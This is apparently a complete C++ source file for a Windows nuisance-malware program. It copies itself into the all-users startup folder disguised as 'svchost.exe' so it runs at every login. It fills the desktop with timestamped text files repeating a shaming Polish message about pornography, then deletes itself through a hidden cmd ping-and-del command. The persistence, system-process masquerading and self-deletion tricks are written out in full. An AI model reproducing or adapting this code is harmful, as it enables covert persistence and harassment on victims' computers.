#include <iostream>
#include <Windows.h>
#include <string>
#include <strsafe.h>
#include <fstream>
#include <ShlObj.h>

#define SELF_REMOVE_STRING TEXT("cmd /c ping localhost -n 3 > nul & del \"%s\"")
#define MESSAGE_FOR_YOU TEXT("Obiecujê, ¿e nie w³¹czê wiecêj porno\n")

bool c0pyMyself(char *path)
{
	char temp[MAX_PATH];
	SHGetFolderPathA(0, CSIDL_COMMON_ALTSTARTUP, 0, SHGFP_TYPE_DEFAULT, temp);
	std::string temp1 = temp;
	temp1 += "\\svchost.exe";
	if (!(path == temp1.c_str()))
	{
		CopyFileA(path, temp1.c_str(), true);
		return 1;
	}
	return 0;
}

void runMyself()
{
	SYSTEMTIME time;
	GetLocalTime(&time);
	
	char temp[MAX_PATH];
	SHGetFolderPathA(0, CSIDL_DESKTOPDIRECTORY, 0, SHGFP_TYPE_DEFAULT, temp);
	std::string temp1 = temp;
	temp1 = temp1 + "\\OBIETNICA_" + std::to_string(time.wDay) + "." + std::to_string(time.wMonth) + "." + std::to_string(time.wYear) + "_" + std::to_string(time.wHour) + "." + std::to_string(time.wMinute) + ".txt";

	std::fstream file;
	file.open(temp1.c_str(), std::ios::out | std::ios::_Noreplace);
	if (file.is_open())
	{
		for (int i = 0; i < 100; i++)
			file << MESSAGE_FOR_YOU;
	}
	else
		std::cerr << "Zjebal sie\n";

	file.close();
}

void k1llMyself()
{
	TCHAR path[MAX_PATH];
	TCHAR command[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, path, MAX_PATH);
	StringCbPrintf(command, 2 * MAX_PATH, SELF_REMOVE_STRING, path);
	CreateProcess(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

int main(int argc, char *argv[])
{
	runMyself();
	if(c0pyMyself(argv[0]));
		k1llMyself();
	return 0;
}